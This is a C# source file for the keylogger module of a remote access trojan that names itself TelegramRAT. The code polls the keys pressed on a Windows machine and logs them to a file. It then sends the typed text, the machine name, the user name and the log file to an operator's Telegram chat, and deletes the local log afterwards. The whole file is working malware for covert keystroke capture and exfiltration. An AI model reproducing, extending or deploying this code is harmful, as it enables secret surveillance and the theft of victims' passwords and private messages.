using System.Text;
using Telegram.Bot;
using Telegram.Bot.Types;
using TelegramRAT.Utilities;

namespace TelegramRAT.Services;

public interface IKeyloggerService
{
    bool IsLogging { get; }
    Task StartLoggingAsync(long chatId);
    void StopLogging();
}

public class KeyloggerService(ITelegramBotClient botClient, IBotSession session, IFileSystemService fileSystemService) : IKeyloggerService
{
    public bool IsLogging => session.IsKeylogging;

    public async Task StartLoggingAsync(long chatId)
    {
        if (session.IsKeylogging) return;
        session.IsKeylogging = true;

        await Task.Run(async () =>
        {
            try
            {
                await botClient.SendMessage(chatId, "Keylog started!");

                var filePath = fileSystemService.GetFullPath("keylog.txt");
                await using var keylogFileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write, FileShare.Read, 4096, useAsync: true);
                using var streamWriter = new StreamWriter(keylogFileStream, Encoding.UTF8, 1024, leaveOpen: true);

                await streamWriter.WriteLineAsync("#Keylog entries (mapped and unmapped).");
                await streamWriter.WriteLineAsync(string.Empty);

                const int snippetMaxLength = 1024;
                var snippetBuilder = new StringBuilder();
                var keys = new List<uint>(10);
                var lastKeys = new List<uint>(10);

                while (session.IsKeylogging)
                {
                    Features.Keylogger.GetPressingKeys(keys);
                    if (!lastKeys.SequenceEqual(keys))
                    {
                        if (keys.Count > 0)
                        {
                            var translation = WinAPI.TranslateKeyCombination(keys);
                            await streamWriter.WriteLineAsync($"Mapped: {translation.Text}");
                            await streamWriter.WriteLineAsync($"Unmapped: {translation.HexFallback}");
                            await streamWriter.WriteLineAsync(string.Empty);
                            await streamWriter.FlushAsync();

                            if (!string.IsNullOrEmpty(translation.Text))
                            {
                                snippetBuilder.Append(translation.Text);
                                if (snippetBuilder.Length > snippetMaxLength)
                                    snippetBuilder.Remove(0, snippetBuilder.Length - snippetMaxLength);
                            }
                        }
                        lastKeys.Clear();
                        lastKeys.AddRange(keys);
                    }
                    await Task.Delay(50);
                }

                await streamWriter.FlushAsync();
                streamWriter.Close();

                var snippet = snippetBuilder.ToString().Trim();
                await botClient.SendMessage(chatId, $"Keylog from {Environment.MachineName}. User: {Environment.UserName}: \n{snippet}");

                await using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read, 4096, useAsync: true))
                {
                    await botClient.SendDocument(chatId, new InputFileStream(fs, "keylog.txt"), caption: $"Keylog from {Environment.MachineName}.");
                }
                
                fileSystemService.DeleteFile(filePath);
            }
            catch (Exception ex)
            {
                session.IsKeylogging = false;
                Console.WriteLine($"Keylogger error: {ex}");
            }
        });
    }

    public void StopLogging()
    {
        session.IsKeylogging = false;
    }
}
